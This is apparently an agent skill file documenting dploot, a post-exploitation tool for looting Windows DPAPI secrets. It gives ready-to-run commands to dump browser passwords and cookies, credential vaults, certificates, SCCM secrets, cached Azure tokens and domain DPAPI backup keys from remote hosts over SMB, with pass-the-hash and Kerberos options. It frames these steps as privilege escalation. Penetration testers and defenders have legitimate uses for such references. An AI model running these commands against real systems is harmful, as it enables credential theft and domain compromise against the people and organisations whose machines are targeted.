---
name: dploot
description: Python rewrite of SharpDPAPI used to loot DPAPI secrets locally or remotely. It can decrypt masterkeys, backup keys from domain controllers, and extract credentials from browsers, vaults, certificates, and SCCM. Use during post-exploitation to escalate privileges or gather sensitive user data from Windows systems.
---

# dploot

## Overview
dploot is a Python tool designed to implement DPAPI (Data Protection API) logic for looting Windows secrets. It allows for the extraction and decryption of credentials, certificates, masterkeys, and browser data from both local files and remote targets via SMB. Category: Post-Exploitation.

## Installation (if not already installed)
Assume dploot is already installed. If the command is missing:

```bash
sudo apt install python3-dploot
```

## Common Workflows

### Triage a remote target using a password
```bash
dploot triage -d domain.local -u username -p password -target 192.168.1.10
```

### Dump browser credentials and cookies remotely
```bash
dploot browser -d domain.local -u username -p password -target 192.168.1.10
```

### Backup DPAPI keys from a Domain Controller
```bash
dploot backupkey -d domain.local -u domain_admin -p password -target DC01.domain.local
```

### Loot SYSTEM secrets (certificates, credentials, vaults)
```bash
dploot machinetriage -d domain.local -u username -p password -target 192.168.1.10
```

## Complete Command Reference

### Global Usage
```bash
dploot [-h] {action} ...
```

### Positional Arguments (Actions)

| Action | Description |
|:-------|:------------|
| `backupkey` | Backup Keys from domain controller |
| `blob` | Decrypt DPAPI blob. Can fetch masterkeys on target |
| `browser` | Dump users credentials and cookies saved in browser from local or remote target |
| `certificates` | Dump users certificates from local or remote target |
| `credentials` | Dump users Credential Manager blob from local or remote target |
| `machinecertificates` | Dump system certificates from local or remote target |
| `machinecredentials` | Dump system credentials from local or remote target |
| `machinemasterkeys` | Dump system masterkey from local or remote target |
| `machinetriage` | Loot SYSTEM Masterkeys, credentials, certificates, and vaults |
| `machinevaults` | Dump system vaults from local or remote target |
| `masterkeys` | Dump users masterkey from local or remote target |
| `mobaxterm` | Dump Passwords and Credentials from MobaXterm |
| `rdg` | Dump users saved password information for RDCMan.settings |
| `sccm` | Dump SCCM secrets (NAA, Collection variables, tasks sequences credentials) |
| `triage` | Loot Masterkeys, credentials, rdg, certificates, browser, and vaults |
| `vaults` | Dump users Vaults blob from local or remote target |
| `wam` | Dump users cached Azure tokens from local or remote target |
| `wifi` | Dump wifi profiles from local or remote target |

### Common Action Options
Most subcommands (like `triage`, `browser`, `masterkeys`) share a common set of connection and authentication flags:

| Flag | Description |
|:-----|:------------|
| `-target` | Target hostname or IP address |
| `-u`, `--user` | Username for authentication |
| `-p`, `--password` | Password for authentication |
| `-d`, `--domain` | Domain name |
| `-hashes` | NTLM hashes, format `LMHASH:NTHASH` |
| `-aesKey` | AES key to use for Kerberos Authentication (128 or 256 bits) |
| `-k` | Use Kerberos authentication. Grabs credentials from ccache file |
| `-dc-ip` | IP address of the domain controller |
| `-local` | Perform actions on local files instead of remote target |

### Specific Subcommand Flags

#### backupkey
Used to retrieve the domain DPAPI backup key.
- `-target`: The Domain Controller to query.

#### blob
Used to decrypt a specific DPAPI blob file.
- `-file`: Path to the blob file.
- `-masterkey`: The masterkey string to use for decryption.

#### sccm
Used to extract secrets from SCCM/MECM environments.
- Supports looting Network Access Accounts (NAA) and task sequence variables.

## Notes
- When using `triage` or `machinetriage`, dploot will attempt to automatically find and use masterkeys found on the system to decrypt other secrets.
- For remote looting, the tool relies on SMB (Port 445) and requires administrative privileges on the target for most actions.
- Use the `-local` flag if you have already exfiltrated the `Appdata/Roaming/Microsoft/Protect` or `System32/Microsoft/Protect` directories.